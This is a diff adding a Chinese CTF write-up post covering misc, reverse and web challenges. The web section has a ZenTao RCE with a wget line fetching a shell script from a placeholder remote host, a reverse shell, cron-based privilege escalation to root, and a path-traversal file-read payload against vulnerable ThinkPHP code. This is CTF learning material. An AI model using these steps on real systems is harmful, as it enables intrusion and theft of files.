@@ -1,0 +1,146 @@
+---
+title: "Spirit Game 2024 WriteUp"
+publishDate: 2024-04-28
+description: '校赛WP留档'
+tags:
+  - Web
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510062334712.jpg', inferSize: true, color: '#da0693ff' }
+language: '简中'
+draft: false
+comment: true
+---
+
+## Misc
+
+### 俄罗斯方块
+
+好像同时消除行数越多得分越高，同时消了4行直接2000多分了，硬玩即可
+
+![ec38f2e37901a4254734f2e2ebf4f3d1](https://s2.loli.net/2024/04/27/cplJPADGYgTo8KH.png)
+
+### App1e_Tree's Big Duck
+
+直接搜图大多都是国外的，从最近比赛入手缩小范围，想到最近ccb决赛在天津，
+
+![4def29f8dbd8ed13f78a8351056da107](https://s2.loli.net/2024/04/27/mCaPRDfYKwvUZL2.png)
+
+虽说看起来不是同一只，但还是猜一手津湾广场
+
+`SpiritGame{津湾广场_ccb.itsec.gov.cn}`
+
+## Reverse
+
+### babySign
+
+![6e74be82f74689a14623dc4256422a90](https://s2.loli.net/2024/04/27/avw3bG2HlFmAnIQ.png)
+
+看一眼主函数逻辑，一个加密后就是`memcpy`
+
+跟进加密函数
+
+![image-20240427191939610](https://s2.loli.net/2024/04/27/z4qUIN8HOk3hAwQ.png)
+
+只做了一次异或
+
+![image-20240427192029971](https://s2.loli.net/2024/04/27/cXLSCqGlfYRx65W.png)
+
+在xor处下断点，取出ecx的值
+
+```python
+x=
+[0x8F,0x65,0x93,0xED,0x91,0x78,0x6C,0xBC,0x7A,0xD8,0xBD,0xA6,0xED,0x1F,0xCA,0xAE,
+0xE0
+,0xCA,0xD3,0xD1,0xA5,0xD8,0xD9,0x01,0xDF,0x38,0x58,0xBF,0x90,0x6B,0x4F,0x69,0xEE,
+0x1B
+,0xDD,0xB1,0x18,0xEA,0x8B,0x42,0x69,0x57,0x2B]
+ida_chars=[0xDC, 0x15, 0xFA, 0x9F, 0xF8, 0x0C, 0x2B, 0xDD, 0x17, 0xBD, 
+  0xC6, 0xF1, 0x88, 0x53, 0x89, 0x9E, 0x8D, 0x8F, 0x8C, 0x85, 
+  0xEA, 0x87, 0xAD, 0x69, 0xBA, 0x67, 0x0F, 0x8F, 0xE2, 0x07, 
+  0x2B, 0x36, 0xA1, 0x7D, 0x82, 0xE3, 0x7D, 0x9C, 0xEE, 0x30, 
+  0x1A, 0x32, 0x56]
+for i in range(len(ida_chars)):
+    num=ida_chars[i]^x[i]
+    print(chr(num),end='')
+```
+
+写脚本异或一下即可
+
+## Web
+
+### GomokuMaster
+
+GitHUB上找了个AI，对下即可
+
+![70a95f087e46cddad18ace76bd03ed5b](https://s2.loli.net/2024/04/27/meGHEgAyQtvhw3B.png)
+
+### MaybeSignin
+
+访问`/zentao/index.php?mode=getconfig`得知版本号为`18.0.beta1`
+
+```json
+{"version":"18.0.beta1","requestType":"PATH_INFO","requestFix":"-","moduleVar":"m","methodVar":"f","viewVar":"t","sessionVar":"zentaosid","systemMode":"ALM","sprintConcept":"0","URAndSR":"0","maxUploadSize":"50M","sessionName":"zentaosid","sessionID":"3916f39ca4f63ef842a60040f2326e8f","random":4673,"expiredTime":"1440","serverTime":1714180443,"rand":4673}
+```
+
+可找到[这篇博客](https://www.freebuf.com/vuls/364470.html)跟着复现即可
+
+注意点是如果payload中带有&符号，则payload会被截断，用远端加载payload到本地的方式执行。
+
+`wget http://x.x.x.x:xxxx/1.sh -O /tmp/shell01.sh`
+
+![image-20240427193255123](https://s2.loli.net/2024/04/27/3mtcPbq7X6LvwQn.png)
+
+反弹`shell`后提示flag在`/root`中
+
+发现项目根目录下`updates`文件夹权限为root，猜测有备份的定时任务
+
+查看进程确实发现其每秒执行
+
+![image-20240427193653634](https://s2.loli.net/2024/04/27/ufWMzsk5LxF1wGp.png)
+
+![a7e544f7e39cc769b56ad6b90fd72214](https://s2.loli.net/2024/04/27/BnLMAIzURHwligO.png)
+
+提权
+
+![d4a5965b4da81f3e132e8ad2b970ff82](https://s2.loli.net/2024/04/27/AkYF4QSa6CXPHqB.png)
+
+![816b7c4eb33440320509f5252114b7c7](https://s2.loli.net/2024/04/27/gUL8qeBC9DMSvy5.png)
+
+### ThinkYourself
+
+`ThinkPHP`框架代码审计
+
+`app/frontend/controller/Ajax.php`
+
+```php
+/**
+     * @return \think\response\Json
+     * 获取文件
+     */
+    public function getfile($file)
+    {
+        $file = root_path().'public/storage/uploads/'.$file;
+        // 检查文件是否存在
+        if (!file_exists($file)) {
+            $result = ['code' => 0, 'msg' => lang('file not exists!')];
+            return json($result);
+        }
+
+        // 获取文件名
+        $fileName = basename($file);
+
+        // 设置HTTP响应头
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . $fileName);
+        header('Content-Length: ' . filesize($file));
+
+        // 读取文件并输出给用户
+        readfile($file);
+
+        // 终止脚本继续执行
+        exit;
+    }
+```
+
+路径穿越 任意文件读取漏洞
+
+`Ajax/getfile?file=../../../../../../../flag`
